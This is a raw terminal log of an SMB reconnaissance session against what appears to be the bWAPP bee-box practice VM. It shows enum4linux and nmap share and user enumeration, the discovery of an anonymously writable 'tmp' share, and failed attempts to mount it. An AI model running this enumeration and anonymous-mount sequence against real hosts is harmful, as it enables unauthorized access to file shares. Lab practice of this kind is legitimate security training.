+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ r[Kenum4linux -a 10.10.10.7
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Aug 18 00:10:53 2020
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 10.10.10.7
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ================================================== 
+|    Enumerating Workgroup/Domain on 10.10.10.7    |
+ ================================================== 
+[+] Got domain/workgroup name: ITSECGAMES
+
+ ========================================== 
+|    Nbtstat Information for 10.10.10.7    |
+ ========================================== 
+Looking up status of 10.10.10.7
+	BEE-BOX         <00> -         B <ACTIVE>  Workstation Service
+	BEE-BOX         <03> -         B <ACTIVE>  Messenger Service
+	BEE-BOX         <20> -         B <ACTIVE>  File Server Service
+	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+	ITSECGAMES      <1d> -         B <ACTIVE>  Master Browser
+	ITSECGAMES      <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+	ITSECGAMES      <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+
+	MAC Address = 00-00-00-00-00-00
+
+ =================================== 
+|    Session Check on 10.10.10.7    |
+ =================================== 
+[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ enum4linux -a 10.10.10.7smbclient //10.10.10.7/tmp [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ smbclient //10.10.10.7/tmp \\10.10.10.7\[C[C[C[C[10@mount -t cifs //10.10.10.7/tmp /mnt/[C\\10.10.10.7\[C[C[C[C[C[C[C[C[C[Cnmap  -p 139 10.10.10.7 --script smb-enum-shares.nse[4Ppsexec.nse enum-users.nse[3Ppsexec.nse enum-users.nse[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@,[1@4[1@4[1@5[C[1@ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C, smb-enum-shares.nse[1Psmb-enum-shares.nse
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 00:16 IST
+Debugging Increased to 1.
+mass_rdns: 13.00s 0/1 [#: 1, OK: 0, NX: 0, DR: 0, SF: 0, TR: 3]
+DNS resolution of 1 IPs took 13.00s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
+Overall sending rates: 1205.55 packets / s.
+NSE: Script scanning 10.10.10.7.
+NSE: Starting runlevel 1 (of 1) scan.
+NSE: Starting smb-enum-shares against 10.10.10.7.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Attempting to log into the system to enumerate shares
+NSE: Starting smb-enum-users against 10.10.10.7.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Added account '' to account list
+NSE: [smb-enum-shares 10.10.10.7] SMB: Added account 'guest' to account list
+NSE: [smb-enum-shares 10.10.10.7] SMB: Extended login to 10.10.10.7 as BEE-BOX\guest failed (NT_STATUS_LOGON_FAILURE)
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-users 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-users 10.10.10.7] SMB: Login as ITSECGAMES\<blank> failed, but was given guest access (username may be wrong, or system may only allow guest)
+NSE: [smb-enum-shares 10.10.10.7] SMB: Found 13 shares, will attempt to find more information
+NSE: smb-enum-users against 10.10.10.7 threw an error!
+/usr/bin/../share/nmap/nselib/msrpctypes.lua:847: attempt to perform arithmetic on a nil value (local 'pos')
+stack traceback:
+	/usr/bin/../share/nmap/nselib/msrpctypes.lua:847: in function 'msrpctypes.unmarshall_int32'
+	/usr/bin/../share/nmap/nselib/msrpc.lua:1418: in function 'msrpc.samr_enumdomains'
+	/usr/bin/../share/nmap/nselib/msrpc.lua:3816: in function 'msrpc.samr_enum_users'
+	/usr/bin/../share/nmap/scripts/smb-enum-users.nse:171: in function </usr/bin/../share/nmap/scripts/smb-enum-users.nse:154>
+	(...tail calls...)
+
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Trying a random share to see if server responds properly: nmap-share-test
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Trying a random share to see if server responds properly: nmap-share-test
+NSE: [smb-enum-shares 10.10.10.7] SMB: Getting information for share: CutePDF_Writer:3
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\CutePDF_Writer:3 can be read by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\CutePDF_Writer:3 can be read by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\CutePDF_Writer:3 can be written by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\CutePDF_Writer:3 can be written by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Getting information for share: Fax:2
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Fax:2 can be read by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Fax:2 can be read by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Fax:2 can be written by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Fax:2 can be written by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Getting information for share: Fax_-_HP_Officejet_6500_E710a-f_(Network):4
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Fax_-_HP_Officejet_6500_E710a-f_(Network):4 can be read by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Fax_-_HP_Officejet_6500_E710a-f_(Network):4 can be read by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Fax_-_HP_Officejet_6500_E710a-f_(Network):4 can be written by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Fax_-_HP_Officejet_6500_E710a-f_(Network):4 can be written by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Getting information for share: HP_Officejet_6500_E710a-f_(Network):5
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\HP_Officejet_6500_E710a-f_(Network):5 can be read by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\HP_Officejet_6500_E710a-f_(Network):5 can be read by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\HP_Officejet_6500_E710a-f_(Network):5 can be written by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\HP_Officejet_6500_E710a-f_(Network):5 can be written by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Getting information for share: IPC$
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\IPC$ can be read by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\IPC$ can be read by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\IPC$ can be written by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\IPC$ can be written by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Getting information for share: Microsoft_XPS_Document_Writer:1
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Microsoft_XPS_Document_Writer:1 can be read by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Microsoft_XPS_Document_Writer:1 can be read by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Microsoft_XPS_Document_Writer:1 can be written by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Microsoft_XPS_Document_Writer:1 can be written by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Getting information for share: PDF
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\PDF can be read by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\PDF can be read by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\PDF can be written by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\PDF can be written by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Getting information for share: Send_To_OneNote_2010:8
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Send_To_OneNote_2010:8 can be read by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Send_To_OneNote_2010:8 can be read by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Send_To_OneNote_2010:8 can be written by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Send_To_OneNote_2010:8 can be written by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Getting information for share: Snagit_9:6
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Snagit_9:6 can be read by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Snagit_9:6 can be read by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Snagit_9:6 can be written by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Snagit_9:6 can be written by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Getting information for share: Xerox_Phaser_8500DN_PS:7
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Xerox_Phaser_8500DN_PS:7 can be read by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Xerox_Phaser_8500DN_PS:7 can be read by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Xerox_Phaser_8500DN_PS:7 can be written by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\Xerox_Phaser_8500DN_PS:7 can be written by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Getting information for share: opt
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\opt can be read by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\opt can be read by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\opt can be written by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\opt can be written by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Getting information for share: print$
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\print$ can be read by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\print$ can be read by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\print$ can be written by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\print$ can be written by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Getting information for share: tmp
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\tmp can be read by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\tmp can be read by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\tmp can be written by the current user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: Checking if share \\10.10.10.7\tmp can be written by the anonymous user
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: [smb-enum-shares 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: Finished smb-enum-shares against 10.10.10.7.
+Nmap scan report for 10.10.10.7
+Host is up (0.0014s latency).
+Scanned at 2020-08-18 00:16:15 IST for 14s
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: <blank>
+|   \\10.10.10.7\CutePDF_Writer:3: 
+|     Type: STYPE_PRINTQ
+|     Comment: CutePDF Writer
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Fax:2: 
+|     Type: STYPE_PRINTQ
+|     Comment: Fax
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Fax_-_HP_Officejet_6500_E710a-f_(Network):4: 
+|     Type: STYPE_PRINTQ
+|     Comment: Fax - HP Officejet 6500 E710a-f (Network)
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\HP_Officejet_6500_E710a-f_(Network):5: 
+|     Type: STYPE_PRINTQ
+|     Comment: HP Officejet 6500 E710a-f (Network)
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (bee-box server (Samba 3.0.28a))
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|   \\10.10.10.7\Microsoft_XPS_Document_Writer:1: 
+|     Type: STYPE_PRINTQ
+|     Comment: Microsoft XPS Document Writer
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\PDF: 
+|     Type: STYPE_PRINTQ
+|     Comment: PDF
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Send_To_OneNote_2010:8: 
+|     Type: STYPE_PRINTQ
+|     Comment: Send To OneNote 2010
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Snagit_9:6: 
+|     Type: STYPE_PRINTQ
+|     Comment: Snagit 9
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Xerox_Phaser_8500DN_PS:7: 
+|     Type: STYPE_PRINTQ
+|     Comment: Xerox Phaser 8500DN PS
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\opt: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: <none>
+|   \\10.10.10.7\tmp: 
+|     Type: STYPE_DISKTREE
+|     Comment: oh noes!
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|_    Anonymous access: READ/WRITE
+Final times for host: srtt: 1387 rttvar: 2876  to: 100000
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 1) scan.
+Read from /usr/bin/../share/nmap: nmap-payloads nmap-services.
+Nmap done: 1 IP address (1 host up) scanned in 14.50 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ mount -t smbfd[Ks \\10.10.10.7\tmp[1Ptmp/tmp[1P10.10.10.7/tmp[1P10.10.10.7/tmp.10.10.10.7/tmp/10.10.10.7/tmp[1P10.10.10.7/tmp[1P10.10.10.7/tmp/10.10.10.7/tmp/10.10.10.7/tmp[C[C[C[C[C[C[C[C[C[C[C[C[C[C /mnt/ 
+mount: /mnt: must be superuser to use mount.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ mount -t smbfs //10.10.10.7/tmp /mnt/ [1@s[1@u[1@d[1@o[1@ 
+[sudo] password for dinesh: 
+mount: /mnt: unknown filesystem type 'smbfs'.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ sudo mount -t smbfs //10.10.10.7/tmp /mnt/ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1P[1P[1@c[1@i
+Password for root@//10.10.10.7/tmp:  (press TAB for no echo)                         
+mount error(2): No such file or directory
+Refer to the mount.cifs(8) manual page (e.g. man mount.cifs) and kernel log messages (dmesg)
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ sudo mount -t cifs //10.10.10.7/tmp /mnt/ [1P[1P[1P[1P[1P
+mount.cifs: permission denied: no match for /mnt found in /etc/fstab
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ mount -t cifs //10.10.10.7/tmp /mnt/ [1@s[1@u[1@ [1P[1P[1P[1@s[1@u[1@d[1@o[1@ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C -o username=anonu[Kymous
+Password for anonymous@//10.10.10.7/tmp:  (press TAB for no echo)                         
+mount error(2): No such file or directory
+Refer to the mount.cifs(8) manual page (e.g. man mount.cifs) and kernel log messages (dmesg)
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ sudo mount -t cifs //10.10.10.7/tmp /mnt/  -o username=anonymous[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ sudo mount -t cifs //10.10.10.7/tmp /mnt/  -o username=anonymous[K[K[K[K[K[K[K[K[K
+username specified with no parameter
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ sudo mount -t cifs //10.10.10.7/tmp /mnt/  -o username=''
+username specified with no parameter
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ sudo mount -t cifs //10.10.10.7/tmp /mnt/  -o username='' '
+Password for  @//10.10.10.7/tmp:  (press TAB for no echo)                         
+mount error(2): No such file or directory
+Refer to the mount.cifs(8) manual page (e.g. man mount.cifs) and kernel log messages (dmesg)
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ sudo mount -t cifs //10.10.10.7/tmp /mnt/  -o username=' '[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[1P[1P[C[C[C[C[C[C[C[C[C[C[1@:
+mount.cifs: bad UNC (10.10.10.7:/tmp)
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ sudo mount -t cifs 10.10.10.7:/tmp /mnt/ //10.10.10.7/tmp /mnt/  -o username=' '[C[C[C[C[C[C[C[C[C[C[1P'[Kanonymous[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[27Pmount -t cifs //10.10.10.7/tmp /mnt/ [5@sudo 